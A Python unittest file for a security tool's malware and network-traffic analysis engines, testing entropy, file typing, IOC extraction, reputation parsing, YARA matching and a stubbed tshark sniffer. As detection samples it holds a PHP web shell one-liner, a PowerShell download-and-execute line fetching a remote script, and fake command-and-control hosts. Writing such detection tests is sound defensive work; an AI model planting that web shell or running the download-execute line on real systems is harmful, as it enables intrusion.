"""Tests for the malware and traffic-analysis engines (analysis_core). Offline: tshark is
stubbed, no files are executed, and the DB is a temp directory."""
import json
import os
import sys
import tempfile
import unittest

import danishrecon

APP_DIR = os.path.dirname(os.path.abspath(danishrecon.__file__))   # the installed package

if "danishrecon.scan_core" not in sys.modules:
    os.chdir(tempfile.mkdtemp(prefix="cyberrecon_tests_"))
os.environ["DISABLE_GEMINI"] = "true"

from danishrecon import scan_core  # noqa: E402
from danishrecon import analysis_core as ac  # noqa: E402


class Helpers(unittest.TestCase):
    def test_entropy_bounds(self):
        self.assertEqual(ac._entropy(b""), 0.0)
        self.assertEqual(ac._entropy(b"\x00" * 1000), 0.0)        # single symbol -> 0
        self.assertEqual(ac._entropy(bytes(range(256))), 8.0)     # uniform -> 8 bits

    def test_file_type_from_magic(self):
        self.assertEqual(ac.file_type(b"MZ\x90\x00"), "PE executable (Windows)")
        self.assertEqual(ac.file_type(b"\x7fELF\x02"), "ELF executable (Linux)")
        self.assertEqual(ac.file_type(b"PK\x03\x04xx"), "ZIP / Office OOXML / JAR")
        self.assertEqual(ac.file_type(b"%PDF-1.7"), "PDF document")
        self.assertEqual(ac.file_type(b"random bytes"), "unknown / data")


class DbScanType(unittest.TestCase):
    def test_scan_type_is_stored_and_listed(self):
        sid = scan_core.DB.new_scan("sample.bin", "malware", scan_type="malware")
        self.assertEqual(scan_core.DB.get_scan(sid)["scan_type"], "malware")
        row = next(s for s in scan_core.DB.list_scans() if s["id"] == sid)
        self.assertEqual(row["scan_type"], "malware")
        # recon default still works
        rid = scan_core.DB.new_scan("example.com", "Quick")
        self.assertEqual(scan_core.DB.get_scan(rid)["scan_type"], "recon")


class MalwareStatic(unittest.TestCase):
    def test_ioc_extraction_and_report(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "conf.txt")
        with open(p, "w", encoding="utf-8") as fh:
            fh.write("c2=http://malicious-c2.example/gate.php\nip=185.220.101.45\ndom=evil-phish.top\n")
        eng = ac.MalwareEngine(p, {})
        eng.log_signal.connect(lambda *a: None)
        eng.run()
        cats = [f["category"] for f in eng.data["findings"]]
        self.assertIn("ioc", cats)
        ioc = next(f for f in eng.data["findings"] if f["category"] == "ioc")
        self.assertEqual(ioc["artifact_type"], "file")
        self.assertTrue(ioc["sha256"])
        self.assertEqual(scan_core.DB.get_scan(eng.scan_id)["scan_type"], "malware")
        # a report + sarif were written
        self.assertTrue(os.path.isfile(eng.data["report_path"]))
        self.assertTrue(os.path.isfile(eng.data["sarif_path"]))

    def test_clean_file_has_no_high_findings(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "notes.txt")
        with open(p, "w", encoding="utf-8") as fh:
            fh.write("an ordinary document with nothing suspicious in it\n" * 10)
        eng = ac.MalwareEngine(p, {})
        eng.log_signal.connect(lambda *a: None)
        eng.run()
        self.assertFalse([f for f in eng.data["findings"] if f["severity"] in ("CRITICAL", "HIGH")])

    def test_reputation_parsing_from_malwarebazaar(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "x.bin")
        open(p, "wb").write(b"benign bytes for hashing")
        eng = ac.MalwareEngine(p, {"reputation": True})
        eng.log_signal.connect(lambda *a: None)

        class _Resp:
            def json(self):
                return {"query_status": "ok", "data": [{"signature": "Emotet", "file_type": "exe",
                                                         "first_seen": "2024-01-01", "tags": ["emotet", "banker"]}]}
        saved = ac.requests.post
        ac.requests.post = lambda *a, **k: _Resp()
        try:
            eng.run()
        finally:
            ac.requests.post = saved
        rep = [f for f in eng.data["findings"] if f["category"] == "reputation"]
        self.assertEqual(len(rep), 1)
        self.assertEqual(rep[0]["severity"], "CRITICAL")
        self.assertIn("Emotet", rep[0]["title"])

    def test_builtin_yara_rules_match_expected_samples(self):
        try:
            import yara
        except Exception:
            self.skipTest("yara-python not installed")
        rules_path = os.path.join(APP_DIR, "yara_rules", "builtin.yar")
        rules = yara.compile(filepath=rules_path)
        eicar = rb'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
        webshell = rb"<?php eval($_POST['cmd']); ?>"
        ps = rb"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
        self.assertEqual([r.rule for r in rules.match(data=eicar)], ["EICAR_Test_File"])
        self.assertIn("Generic_WebShell_Indicators", [r.rule for r in rules.match(data=webshell)])
        self.assertIn("Suspicious_PowerShell_Download_Exec", [r.rule for r in rules.match(data=ps)])
        self.assertEqual(rules.match(data=b"a perfectly ordinary sentence"), [])


class SnifferOffline(unittest.TestCase):
    """Drive SnifferEngine with tshark stubbed, so findings are deterministic and no capture
    or pcap file is needed."""

    def _engine(self, responses, ioc_file=None):
        eng = ac.SnifferEngine("capture.pcap", {"ioc_file": ioc_file})
        eng.tshark = "tshark"              # pretend it's installed
        eng.log_signal.connect(lambda *a: None)
        # route each tshark call to a canned result based on a keyword in the args
        def fake(args, timeout=300):
            key = " ".join(args)
            for needle, text in responses.items():
                if needle in key:
                    return scan_core.CmdResult(text, status="ok")
            return scan_core.CmdResult("", status="ok")
        eng._tshark = fake
        # make the pcap "exist"
        eng.source = __file__                # any existing file passes the isfile() check
        return eng

    def test_detects_cleartext_creds_http_dns_ioc(self):
        d = tempfile.mkdtemp()
        ioc = os.path.join(d, "iocs.txt")
        open(ioc, "w").write("evil-phish.top\n")
        responses = {
            "io,phs": "  eth frames:4\n  ip frames:4\n",
            "dns.flags.response==0": "evil-phish.top\nexample.com\n",
            "http.request": "intranet.local\t/admin\n",
            "tls.handshake": "",
            "http.authbasic": "user:password\n",
            'ftp.request.command=="USER"': "USER\tadmin\n",
            "telnet": "",
            "pop.request": "",
            "imap.request": "",
            # insecure-protocol probes
            "-Y ftp -T": "12\n",
            "-Y http -T": "8\n",
            "-Y telnet -T": "",
            "-Y snmp -T": "",
            "-Y tftp -T": "",
            "-Y ldap -T": "",
        }
        eng = self._engine(responses, ioc_file=ioc)
        eng.run()
        cats = {f["category"] for f in eng.data["findings"]}
        self.assertIn("ioc", cats)                  # evil-phish.top matched the IOC list
        self.assertIn("cleartext", cats)            # plain HTTP
        self.assertIn("cleartext-creds", cats)      # HTTP Basic + FTP
        self.assertIn("insecure-protocol", cats)
        creds = [f for f in eng.data["findings"] if f["category"] == "cleartext-creds"]
        self.assertTrue(any("HTTP Basic" in f["title"] for f in creds))
        self.assertTrue(any("FTP" in f["title"] for f in creds))
        self.assertEqual(scan_core.DB.get_scan(eng.scan_id)["scan_type"], "sniff")

    def test_clean_capture_has_no_cred_findings(self):
        responses = {"io,phs": "eth frames:2\n", "tls.handshake": "example.com\n"}
        eng = self._engine(responses)
        eng.run()
        self.assertFalse([f for f in eng.data["findings"] if f["category"] == "cleartext-creds"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
